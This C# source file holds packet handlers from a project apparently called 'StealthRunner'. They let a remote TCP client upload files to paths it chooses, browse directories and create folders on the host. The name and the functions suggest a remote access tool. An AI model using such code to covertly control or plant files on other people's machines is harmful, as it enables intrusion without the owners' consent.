using FlexiLeaf.Core.Network;
using FlexiLeaf.Core.Network.Packets;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace FlexiLeaf.StealthRunner.Handlers
{
    internal class FilesHandlers
    {

        [PacketHandler]
        public static void ReceiveFile(SendFilePacket packet, TcpClient Client)
        {
            packet.WriteFileFromChunks();
            if (packet.CurrentChunk == packet.TotalChunk)
                Console.WriteLine("New File upload : " + Path.GetFullPath(packet.FilePath));
            //packet.Data = new byte[0];
            //await Client.Send(packet);
        }

        [PacketHandler]
        public async static void FileExplorer(FileExplorerPacket packet, TcpClient Client)
        {
            packet.ExplorePath();
            await Client.Send(packet);
        }

        [PacketHandler]
        public async static void FileExplorer(CreateFolderPacket packet, TcpClient Client)
        {
            try
            {
                string newPath = Path.Combine(packet.Path, packet.Name);

                if (!Directory.Exists(newPath))
                {
                    Directory.CreateDirectory(newPath);
                    var fileExplorerPacket = new FileExplorerPacket(packet.Path);
                    fileExplorerPacket.ExplorePath();
                    await Client.Send(fileExplorerPacket);

                }
                else
                {
                }
            }
            catch (Exception ex)
            {
            }
        }




    }
}
